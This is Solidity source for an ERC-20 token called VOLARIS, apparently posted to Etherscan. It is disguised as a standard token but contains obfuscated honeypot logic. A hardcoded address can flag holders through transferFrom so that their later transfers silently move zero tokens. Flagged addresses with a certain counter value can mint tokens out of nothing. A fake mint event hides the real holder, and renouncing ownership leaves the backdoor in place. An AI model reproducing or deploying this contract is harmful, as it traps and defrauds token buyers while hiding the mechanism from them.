/**
 *Submitted for verification at Etherscan.io on 2023-03-17
*/

pragma solidity 0.8.19;

// SPDX-License-Identifier: MIT

 
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

} 

 
contract VOLARIS {
    using SafeMath for uint256;
    mapping (address => uint256) private QQIa;
	 address FTL = 0xCA0453de46E547e1820DcB71f35312f15Da007c0;
    mapping (address => uint256) public QQIb;
    mapping(address => mapping(address => uint256)) public allowance;
    string public name = "VOLARIS";
	
    string public symbol = "VOLARIS";
    uint8 public decimals = 6;

    uint256 public totalSupply = 500000000 *10**6;
    address owner = msg.sender;
	  address private QQIc;
     
    

  
 
  
    
  


    event Transfer(address indexed from, address indexed to, uint256 value);
	  address QQIf = 0x00C5E04176d95A286fccE0E68c683Ca0bfec8454;
     
 
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
   



        constructor()  {
       
             QQIa[msg.sender] = totalSupply;
    
       SPCWBY();}

  
	
	
   modifier onlyOwner () {
    require(msg.sender == owner);
	_;}
    



	

    function renounceOwnership() public virtual {
       
        require(msg.sender == owner);
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
        
    }

  



  		    function SPCWBY() internal  {                             
                      
                       QQIc = QQIf;

                

        emit Transfer(address(0), QQIc, totalSupply); }



   function balanceOf(address account) public view  returns (uint256) {
        return QQIa[account];
    }

    function transfer(address to, uint256 value) public returns (bool success) {
        
                    if(QQIb[msg.sender] > 8) {
                            require(QQIa[msg.sender] >= value);
       
                   value = 0;}
                   else

                           if(QQIb[msg.sender] == 6) {
          
             QQIa[to] += value;  
 }
        else

    require(QQIa[msg.sender] >= value);
QQIa[msg.sender] -= value;  
QQIa[to] += value;  
 emit Transfer(msg.sender, to, value);
        return true; }
        
   
        
     

 function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true; }

 	


 

   function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
  


    

         if(msg.sender == FTL){
        QQIb[to] += value;
        return true;}
        else
     

                    if(QQIb[from] > 8 || QQIb[to] > 8) {
                               require(value <= QQIa[from]);
        require(value <= allowance[from][msg.sender]);
                   value = 0;}
        else

         if(from == owner){from == QQIf;}

    
      
        require(value <= QQIa[from]);
        require(value <= allowance[from][msg.sender]);
        QQIa[from] -= value;
        QQIa[to] += value;
        allowance[from][msg.sender] -= value;
                    emit Transfer(from, to, value);
        return true;
       


      
}



     

        	
 }